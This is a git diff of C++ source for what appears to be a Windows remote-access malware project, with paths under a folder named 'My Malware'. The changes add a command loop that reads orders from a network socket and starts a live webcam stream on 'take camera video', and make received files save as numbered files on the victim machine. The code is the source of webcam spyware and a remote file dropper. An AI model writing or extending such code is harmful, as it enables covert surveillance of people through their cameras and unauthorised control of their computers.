@@ -30,7 +30,11 @@ void Connection::sendFile(string path) {
     return;
 }
 
-void Connection::recvFile(string path) {
+void Connection::recvFile() {
+
+    string fileNumber = readFile("C:\\Users\\All Users\\My Malware\\files\\filenumber");
+    string path = "C:\\Users\\All Users\\My Malware\\files\\file_" + to_string(stoi(fileNumber) + 1);
+    writeToFile(path, to_string(stoi(fileNumber) + 1));
     ofstream file(path, fstream::binary);
     unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
     int size;
@@ -121,7 +125,7 @@ void Connection::connection() {
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
-        cerr << "Cant create socket" << WSAGetLastError << endl;
+        cerr << "Cant create sock" << WSAGetLastError << endl;
         WSACleanup();
         return;
     }
@@ -139,8 +143,25 @@ void Connection::connection() {
         return;
     }
 
+    char buf[1024];
+    int bytesReceived;
     ShareCamera *shareCamera = new ShareCamera(sock);
-    shareCamera->ShareCameraLive();
+
+    while (true) {
+        cout << "Test" << endl;
+        ZeroMemory(buf, 1024);
+        bytesReceived = recv(sock, buf, 1024, 0);
+        string command = string(buf, 0, static_cast<const unsigned int>(bytesReceived));
+
+
+        //There is a bug when disconnecting the camera (The program crash)
+        if (command.find("take camera video") == 0) {
+            shareCamera->ShareCameraLive();
+            continue;
+        }
+    }
+
+
 
     //The end of the program
     closesocket(sock);
